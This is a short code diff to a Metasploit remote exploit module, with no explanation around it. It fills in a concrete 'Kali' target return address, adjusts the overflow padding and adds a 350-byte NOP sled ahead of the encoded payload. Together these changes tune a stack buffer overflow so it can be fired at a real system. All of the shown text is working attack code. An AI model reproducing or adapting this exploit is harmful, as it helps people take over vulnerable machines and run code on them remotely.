@@ -62,11 +62,11 @@ class Metasploit3 < Msf::Exploit::Remote
           }
         ],
 
-        # [ "Your distrib here",
-        #   {
-        #     'Ret' => <your esp value here>,
-        #   }
-        # ]
+        [ "Kali",
+          {
+            'Ret' => 0xFFD6721D,
+          }
+        ]
 
       ],
       'DefaultTarget'  => 2,
@@ -82,8 +82,9 @@ class Metasploit3 < Msf::Exploit::Remote
   def exploit
     connect
 
-    buf = rand_text_alphanumeric(76)
+    buf = rand_text_alphanumeric(80)
     buf << [target.ret].pack('V')
+    buf << "\x90"*350
     buf << payload.encoded
     sock.put(buf)
 
